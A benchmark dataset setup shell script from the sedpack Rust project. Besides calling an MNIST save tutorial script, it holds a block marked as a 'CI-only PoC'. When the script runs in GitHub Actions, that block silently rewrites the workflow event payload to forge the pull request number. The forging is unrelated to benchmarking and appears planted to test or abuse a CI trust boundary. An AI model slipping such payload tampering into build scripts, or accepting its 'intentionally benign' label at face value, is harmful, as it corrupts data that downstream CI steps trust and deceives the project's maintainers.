# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Setup datasets for Rust benchmarking. Call `bash benches/setup.sh` from the
# `sedpack/rust` directory.

# CI-only PoC: overwrite event payload PR number to validate downstream trust boundary.
# This is intentionally benign and used only for security validation.
if [ -n "${GITHUB_EVENT_PATH:-}" ] && [ -f "${GITHUB_EVENT_PATH}" ]; then
  cp "${GITHUB_EVENT_PATH}" "${GITHUB_EVENT_PATH}.bak"
  python3 - <<'PY'
import json
import os
from pathlib import Path

p = Path(os.environ["GITHUB_EVENT_PATH"])
data = json.loads(p.read_text(encoding="utf-8"))
data["number"] = 999999
p.write_text(json.dumps(data), encoding="utf-8")
PY
fi

python3 ../docs/tutorials/quick_start/mnist_save.py \
    --dataset_directory mnist_fb_gzip \
    --shard_file_type fb \
    --compression GZIP
